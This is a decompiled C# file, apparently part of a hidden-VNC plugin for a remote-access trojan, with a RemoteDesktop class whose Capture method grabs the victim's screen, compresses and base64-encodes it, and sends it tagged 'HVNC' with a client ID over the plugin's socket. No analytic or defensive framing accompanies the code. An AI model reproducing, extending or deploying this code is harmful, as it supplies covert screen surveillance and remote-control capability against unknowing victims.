using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using HVNC;
using Microsoft.VisualBasic.CompilerServices;
using VNC;

// Token: 0x02000004 RID: 4
public class RemoteDesktop
{
	// Token: 0x06000032 RID: 50 RVA: 0x00002F24 File Offset: 0x00001124
	public static ImageCodecInfo GetEncoderInfo(string M)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = 0;
		int num2 = imageEncoders.Length;
		for (int i = num; i <= num2; i++)
		{
			bool flag = Operators.CompareString(imageEncoders[i].MimeType, M, false) == 0;
			if (flag)
			{
				return imageEncoders[i];
			}
		}
		return null;
	}

	// Token: 0x06000033 RID: 51 RVA: 0x00002F7C File Offset: 0x0000117C
	public static void Capture(int Q, double Size)
	{
		Bitmap screen = HelperScreen.GetScreen(Plugin.Helper.ScreenX, Plugin.Helper.ScreenY);
		Bitmap bitmap = new Bitmap(screen, (int)Math.Round((double)Plugin.Helper.ScreenX * Size), (int)Math.Round((double)Plugin.Helper.ScreenY * Size));
		EncoderParameter encoderParameter = new EncoderParameter(Encoder.Quality, Convert.ToInt64(Q));
		ImageCodecInfo encoderInfo = RemoteDesktop.GetEncoderInfo("image/jpeg");
		EncoderParameters encoderParameters = new EncoderParameters(1);
		encoderParameters.Param[0] = encoderParameter;
		try
		{
			Socket s = Plugin.ClientSocket.S;
			lock (s)
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					bitmap.Save(memoryStream, encoderInfo, encoderParameters);
					Plugin.ClientSocket.Send(string.Concat(new string[]
					{
						"HVNC",
						Plugin.Settings.SPL,
						Plugin.Settings.IDD,
						Plugin.Settings.SPL,
						Convert.ToBase64String(Plugin.Helper.Compress(memoryStream.ToArray()))
					}));
				}
			}
		}
		catch (Exception ex)
		{
		}
		GC.Collect();
	}
}
